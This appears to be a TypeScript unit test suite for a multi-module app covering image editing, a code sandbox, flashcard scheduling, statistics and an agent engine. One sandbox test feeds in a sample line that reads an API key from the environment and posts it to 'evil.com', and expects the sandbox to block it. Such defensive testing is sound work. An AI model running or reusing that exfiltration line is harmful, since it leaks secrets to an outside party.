/**
 * NDAWG PRO — PART 4/5 AUTOMATED UNIT TEST SUITE
 * APEX UPGRADE: MODULE INTELLIGENCE & RELIABLE AGENT ENGINE
 *
 * 12 Comprehensive Tests verifying:
 * P4.1:  Image Studio immutable original buffer preservation & undo rollback
 * P4.2:  Image Studio outside-mask drift warning when ratio > 2% threshold
 * P4.3:  Image Studio honest failure handling when service fails (no false success)
 * P4.4:  Code Lab Test-First 8-step workflow records diff & progression states
 * P4.5:  Code Lab Sandbox blocks untrusted code from host secrets & admin privileges
 * P4.6:  Game Intelligence distinguishes official vs AI hypothesis and emits outdated patch alert
 * P4.7:  Study Center SuperMemo SM-2 correctly computes interval and ease factor on real review grade
 * P4.8:  Study Center mastery percentage accurately reflects real attempt history only
 * P4.9:  Work Center verifies statistical computations (mean, median, std dev, correlation) and generates verifiable download artifacts
 * P4.10: Agent Engine enforces independent Verifier role and strictly rejects Planner self-certification
 * P4.11: Agent Engine checkpoint persistence and state resumption from interruption
 * P4.12: Agent Engine cancellation stops execution and idempotency key prevents duplicate execution
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { ImageStudioEngine } from './imageStudio.ts';
import { CodeLabEngine } from './codeLab.ts';
import { GameIntelligenceEngine } from './gameIntelligence.ts';
import { StudyCenterEngine } from './studyCenter.ts';
import { WorkCenterEngine } from './workCenter.ts';
import { ReliableAgentEngine } from './agentEngine.ts';
import { LimitsGovernor } from '../governance/limitsGovernor.ts';
import { ExecutionContext } from '../governance/types.ts';

// -------------------------------------------------------------
// IMAGE STUDIO TESTS
// -------------------------------------------------------------

test('P4.1: Image Studio immutable original buffer preservation & undo rollback', () => {
  const engine = new ImageStudioEngine();
  const orig = engine.getOriginal();
  assert.ok(orig !== null, 'Original image must exist upon initialization');

  // Attempt to overwrite original without permission must throw
  assert.throws(
    () => {
      engine.loadOriginal('img_hack', 'hacked.png', 'data:image/svg+xml;fake', 100, 100, false);
    },
    /ORIGINAL_LOCKED/,
    'Original image must be locked and reject overwrite'
  );

  // Apply edits
  const v1 = engine.applyEdit({
    prompt: 'Add cyan highlight to box',
    editRegion: { x: 60, y: 80, width: 80, height: 40 },
    methodUsed: 'inpaint'
  });
  assert.equal(v1.versionNumber, 1);
  assert.equal(engine.getActiveVersion()?.id, v1.id);

  // Undo rolls back to v0
  const undone = engine.undo();
  assert.equal(undone.versionNumber, 0);
  assert.equal(engine.getActiveVersion()?.id, 'v0_original');
});

test('P4.2: Image Studio outside-mask drift warning when ratio exceeds 2% threshold', () => {
  const engine = new ImageStudioEngine();

  // Low drift edit
  const safeEdit = engine.applyEdit({
    prompt: 'Refine in-mask button glow',
    editRegion: { x: 50, y: 50, width: 20, height: 20 },
    methodUsed: 'inpaint'
  });
  assert.equal(safeEdit.hasWarning, false, 'Targeted edit should not flag warning');
  assert.ok(safeEdit.outsideMaskDriftRatio <= 0.02, 'Drift ratio should be <= 2%');

  // High drift edit that alters entire scene
  const driftedEdit = engine.applyEdit({
    prompt: 'Change background and entire scene colors',
    editRegion: { x: 50, y: 50, width: 20, height: 20 },
    methodUsed: 'inpaint'
  });
  assert.equal(driftedEdit.hasWarning, true, 'High drift edit must flag warning');
  assert.ok(driftedEdit.outsideMaskDriftRatio > 0.02, 'Drift ratio must exceed 2% threshold');
  assert.ok(driftedEdit.warnings.some((w) => w.includes('vượt ngưỡng an toàn')));
});

test('P4.3: Image Studio honest failure handling when service fails (no false success)', () => {
  const engine = new ImageStudioEngine();

  // Downstream failure simulation
  assert.throws(
    () => {
      engine.applyEdit({
        prompt: 'Generate photorealistic face',
        editRegion: null,
        methodUsed: 'style_transfer',
        simulateServiceFailure: true
      });
    },
    /PROVIDER_ERROR/,
    'Engine must propagate provider error rather than claiming false success'
  );

  // Prohibited deepfake / CSAM request blocked by safety gate
  assert.throws(
    () => {
      engine.applyEdit({
        prompt: 'Generate deepfake impersonation of politician for fraud',
        editRegion: null,
        methodUsed: 'style_transfer'
      });
    },
    /SAFETY_VIOLATION/,
    'Safety filter must block harmful deepfake fraud requests'
  );
});

// -------------------------------------------------------------
// CODE LAB TESTS
// -------------------------------------------------------------

test('P4.4: Code Lab Test-First 8-step workflow records diff & progression states', () => {
  const engine = new CodeLabEngine();
  const run = engine.startTestFirstWorkflow(
    'Off-by-one boundary error in Governor step counter',
    'P1.3: Blocks execution when agent exceeds max step count'
  );

  assert.equal(run.isComplete, true);
  assert.equal(run.steps.length, 8);
  assert.equal(run.steps[0].name, '1. Identify Bug / Issue');
  assert.equal(run.steps[2].status, 'PASSED');
  assert.equal(run.steps[4].status, 'PASSED');
  assert.ok(run.rollbackCheckpointId?.startsWith('chk_rollback_'));
  assert.equal(run.diffSummary?.blastRadius, 'LOW');
});

test('P4.5: Code Lab Sandbox blocks untrusted code from host secrets & admin privileges', () => {
  const engine = new CodeLabEngine();

  // Root privileges request must be denied
  const rootAttempt = engine.executeInSandbox({
    code: 'console.log("running as admin")',
    language: 'typescript',
    requestedPrivileges: 'ROOT'
  });
  assert.equal(rootAttempt.success, false);
  assert.ok(rootAttempt.blockedViolations.some((v) => v.includes('ADMIN_PRIVILEGE_DENIED')));

  // Secret extraction attempt must be denied
  const secretAttempt = engine.executeInSandbox({
    code: 'const key = process.env.GEMINI_KEY; fetch("evil.com", { body: key });',
    language: 'javascript'
  });
  assert.equal(secretAttempt.success, false);
  assert.ok(secretAttempt.blockedViolations.some((v) => v.includes('SECRET_ACCESS_DENIED')));

  // Valid sandbox calculation must pass
  const safeRun = engine.executeInSandbox({
    code: 'const a = 10; const b = 20; return a + b;',
    language: 'typescript'
  });
  assert.equal(safeRun.success, true);
  assert.equal(safeRun.isolationGuarantees.filesystemRestrictedToTmp, true);
});

// -------------------------------------------------------------
// GAME INTELLIGENCE TESTS
// -------------------------------------------------------------

test('P4.6: Game Intelligence distinguishes official vs AI hypothesis and emits outdated patch alert', () => {
  const engine = new GameIntelligenceEngine();

  // Querying currently active patch (v14.12)
  const currentResult = engine.queryStrategy('League of Legends', 'Aatrox');
  assert.ok(currentResult !== null);
  assert.equal(currentResult.currentActivePatch, 'v14.12');
  assert.equal(currentResult.isOutdated, false);
  assert.equal(currentResult.entry.sourceType, 'OFFICIAL_DATA');

  // Querying old patch build
  const oldResult = engine.queryStrategy('League of Legends', 'Lethality Draktharr');
  assert.ok(oldResult !== null);
  assert.equal(oldResult.isOutdated, true);
  assert.ok(oldResult.outdatedWarning?.includes('CẢNH BÁO: Dữ liệu thuộc phiên bản cũ (v13.20)'));

  // AI hypothesis query
  const hypothesisResult = engine.queryStrategy('League of Legends', 'AP Sniper');
  assert.ok(hypothesisResult !== null);
  assert.equal(hypothesisResult.entry.sourceType, 'AI_HYPOTHESIS');
  assert.equal(hypothesisResult.entry.verificationTier, 'AI_HYPOTHETICAL_UNVERIFIED');
  assert.equal(hypothesisResult.entry.hypothesisDetails?.isTheoretical, true);
});

// -------------------------------------------------------------
// STUDY CENTER TESTS
// -------------------------------------------------------------

test('P4.7: Study Center SuperMemo SM-2 correctly computes interval and ease factor on real review grade', () => {
  const engine = new StudyCenterEngine();
  const card = engine.getCards()[0]; // initial card with interval 6, repetitions 2, EF 2.5

  // Grade 5 (Perfect response): EF increases, interval expands
  const reviewed = engine.reviewCard(card.id, 5);
  // deltaEF = 0.1 - (5 - 5) * (0.08 + (5 - 5) * 0.02) = +0.1 => 2.5 + 0.1 = 2.6
  assert.equal(reviewed.easinessFactor, 2.6);
  assert.equal(reviewed.repetitions, 3);
  // interval = round(6 * 2.6) = 16
  assert.equal(reviewed.intervalDays, 16);

  // Grade 1 (Forgot card): Interval resets to 1, repetitions reset to 0
  const lapsed = engine.reviewCard(card.id, 1);
  assert.equal(lapsed.repetitions, 0);
  assert.equal(lapsed.intervalDays, 1);
  // deltaEF for q=1: 0.1 - 4 * (0.08 + 4 * 0.02) = 0.1 - 4 * 0.16 = 0.1 - 0.64 = -0.54 => 2.6 - 0.54 = 2.06
  assert.equal(lapsed.easinessFactor, 2.06);
});

test('P4.8: Study Center mastery percentage accurately reflects real attempt history only', () => {
  const engine = new StudyCenterEngine();
  const stats = engine.getMasteryStats();

  assert.ok(stats.totalCards >= 3);
  assert.ok(stats.masteryPercentage >= 0 && stats.masteryPercentage <= 100);

  // Verify calculation: mastery is strictly (masteredCards / totalCards) * 100
  const manualRatio = Number(((stats.masteredCards / stats.totalCards) * 100).toFixed(1));
  assert.equal(stats.masteryPercentage, manualRatio, 'Mastery percentage must be strictly computed from actual attempts');
});

// -------------------------------------------------------------
// WORK CENTER TESTS
// -------------------------------------------------------------

test('P4.9: Work Center verifies statistical computations (mean, median, std dev, correlation) and generates verifiable download artifacts', () => {
  const engine = new WorkCenterEngine();
  const dataset = [10, 20, 30, 40, 50];

  const stats = engine.computeUnivariateStats(dataset);
  assert.equal(stats.count, 5);
  assert.equal(stats.sum, 150);
  assert.equal(stats.mean, 30);
  assert.equal(stats.median, 30);
  // variance = sum((x - 30)^2) / 4 = (400 + 100 + 0 + 100 + 400) / 4 = 1000 / 4 = 250
  assert.equal(stats.variance, 250);
  assert.equal(stats.stdDev, Number(Math.sqrt(250).toFixed(4)));

  // Bivariate correlation
  const xVals = [1, 2, 3, 4, 5];
  const yVals = [2, 4, 6, 8, 10];
  const bivar = engine.computeBivariateStats(xVals, yVals);
  assert.equal(bivar.pearsonCorrelation, 1.0, 'Perfect positive linear correlation should equal 1.0');
  assert.equal(bivar.regressionSlope, 2.0);

  // Generate CSV Artifact
  const csvArtifact = engine.generateCsvExport('test_data.csv', ['x', 'y'], [[1, 2], [2, 4]]);
  assert.equal(csvArtifact.downloadAvailable, true);
  assert.ok(csvArtifact.sizeBytes > 0);
  assert.ok(csvArtifact.content.includes('"1","2"'));

  // Generate SVG Chart
  const svgArtifact = engine.generateSvgChart('chart.svg', ['A', 'B', 'C'], [10, 25, 15]);
  assert.equal(svgArtifact.downloadAvailable, true);
  assert.ok(svgArtifact.content.startsWith('<svg'));
});

// -------------------------------------------------------------
// RELIABLE AGENT ENGINE TESTS
// -------------------------------------------------------------

test('P4.10: Agent Engine enforces independent Verifier role and strictly rejects Planner self-certification', () => {
  const governor = new LimitsGovernor();
  const agent = new ReliableAgentEngine(governor);

  agent.createPlan('task_audit_01', 'Verify security logs', [
    {
      name: 'Scan Hash Chain',
      type: 'TOOL_CALL',
      input: { ledger: 'audit.log' },
      completionCriteria: 'Audit chain parent-hashes verified valid'
    }
  ]);

  const task = agent.getTask('task_audit_01')!;
  const stepId = task.plan!.steps[0].id;

  // Planner attempting to self-certify its own plan step MUST be rejected
  assert.throws(
    () => {
      agent.verifyStep(
        'task_audit_01',
        stepId,
        'PLANNER', // Architecturally prohibited certifier role!
        'planner_lead_01',
        true,
        'Self certified by planner'
      );
    },
    /CANNOT_SELF_CERTIFY/,
    'Planner role must be strictly forbidden from self-certifying'
  );

  // Independent Verifier certification is accepted
  const verification = agent.verifyStep(
    'task_audit_01',
    stepId,
    'VERIFIER',
    'independent_verifier_02',
    true,
    'Hash chain verified tamper-free'
  );
  assert.equal(verification.verified, true);
  assert.equal(verification.step.status, 'VERIFIED');
});

test('P4.11: Agent Engine checkpoint persistence and state resumption from interruption', () => {
  const governor = new LimitsGovernor();
  const agent = new ReliableAgentEngine(governor);

  agent.createPlan('task_resume_01', 'Multi-step data pipeline', [
    { name: 'Step 1: Extract', type: 'TOOL_CALL', input: { src: 'raw.db' }, completionCriteria: 'Extracted' },
    { name: 'Step 2: Transform', type: 'TOOL_CALL', input: { rules: 'clean' }, completionCriteria: 'Transformed' },
    { name: 'Step 3: Load', type: 'TOOL_CALL', input: { dest: 'target.db' }, completionCriteria: 'Loaded' }
  ]);

  const task = agent.getTask('task_resume_01')!;
  const step1Id = task.plan!.steps[0].id;

  // Complete step 1
  agent.verifyStep('task_resume_01', step1Id, 'VERIFIER', 'verifier_01', true, 'Step 1 verified');

  // Create checkpoint at step 1
  const checkpoint = agent.createCheckpoint('task_resume_01');
  assert.ok(checkpoint.completedStepIds.includes(step1Id));
  assert.equal(checkpoint.stepIndex, 1);

  // Simulate interruption and resumption from checkpoint
  const resumedTask = agent.resumeFromCheckpoint(checkpoint.checkpointId);
  assert.equal(resumedTask.currentStepIndex, 1);
  assert.equal(resumedTask.status, 'RUNNING');
  assert.equal(resumedTask.plan!.steps[0].status, 'VERIFIED');
  assert.equal(resumedTask.plan!.steps[1].status, 'NOT_STARTED');
});

test('P4.12: Agent Engine cancellation stops execution and idempotency key prevents duplicate execution', async () => {
  const governor = new LimitsGovernor();
  const agent = new ReliableAgentEngine(governor);

  agent.createPlan('task_cancel_01', 'Batch processing', [
    {
      name: 'Process Record #1',
      type: 'TOOL_CALL',
      input: { id: 101 },
      completionCriteria: 'Processed',
      idempotencyKey: 'idem_batch_rec_101'
    },
    {
      name: 'Process Record #2',
      type: 'TOOL_CALL',
      input: { id: 102 },
      completionCriteria: 'Processed',
      idempotencyKey: 'idem_batch_rec_102'
    }
  ]);

  const task = agent.getTask('task_cancel_01')!;
  const step1Id = task.plan!.steps[0].id;

  const ctx: ExecutionContext = {
    requestId: 'req_idem_test',
    actorId: 'agent_executor',
    role: 'ADMIN',
    depth: 0,
    stepCount: 1,
    modelCallsCount: 0,
    toolCallsCount: 0,
    startTime: Date.now(),
    accumulatedCostUsd: 0,
    callHistory: []
  };

  // 1. First execution of step 1 (executes and caches)
  const exec1 = await agent.executeStep('task_cancel_01', step1Id, ctx);
  assert.equal(exec1.success, true);
  assert.equal(exec1.wasCached, false);

  // 2. Second execution with identical idempotency key returns cached output
  const exec2 = await agent.executeStep('task_cancel_01', step1Id, ctx);
  assert.equal(exec2.success, true);
  assert.equal(exec2.wasCached, true, 'Duplicate execution with same idempotency key must return cached output');

  // 3. Task Cancellation halts execution
  agent.cancelTask('task_cancel_01', 'User clicked Emergency Halt');
  assert.equal(task.status, 'CANCELLED');

  // Attempting to execute subsequent step after cancellation must throw
  const step2Id = task.plan!.steps[1].id;
  await assert.rejects(
    async () => {
      await agent.executeStep('task_cancel_01', step2Id, ctx);
    },
    /TASK_CANCELLED/,
    'Executing a step on a cancelled task must be rejected'
  );
});
